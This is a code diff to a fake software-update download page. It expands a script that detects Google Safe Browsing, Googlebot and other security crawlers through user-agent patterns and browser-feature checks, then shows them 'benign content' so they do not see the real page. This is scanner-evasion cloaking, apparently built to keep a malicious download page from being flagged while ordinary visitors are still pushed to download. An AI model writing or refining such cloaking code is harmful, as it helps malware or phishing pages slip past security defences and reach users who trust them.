@@ -142,16 +142,42 @@
         <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Click the button above to download the update.</p>
     </div>
     <script>
-        // GSB Crawler Protection: Additional layer of protection
+        // Enhanced GSB Crawler Protection: User-Agent patterns + Browser features
         // If loaded via document.write from update.html, crawlers were already filtered
         // If accessed directly, this will block crawlers
         (function() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const userAgent = navigator.userAgent || '';
+            
+            // Google Safe Browsing and bot detection patterns
+            const googleBotPatterns = [
+                /googlebot/i,
+                /google.*safe.*browsing/i,
+                /google.*safebrowsing/i,
+                /safebrowsing/i,
+                /google.*security/i,
+                /google.*malware/i,
+                /google.*phishing/i,
+                /google.*transparency/i,
+                /google.*site.*verification/i,
+                /google.*page.*speed/i,
+                /adsbot-google/i,
+                /mediapartners-google/i
+            ];
+            
+            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
+            
+            // Mobile detection
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            
+            // Browser feature checks
             const hasNotificationAPI = typeof self.Notification !== 'undefined';
             const hasWebdriver = navigator.webdriver === true;
             const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
             const hasChrome = window.chrome && window.chrome.runtime;
-            const isRealBrowser = (hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome)) || isMobile;
+            const hasPermissions = navigator.permissions !== undefined;
+            
+            // Real browser: Not a Google bot AND has browser features OR is mobile
+            const isRealBrowser = !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
             
             if (!isRealBrowser) {
                 // Crawler detected - show benign content
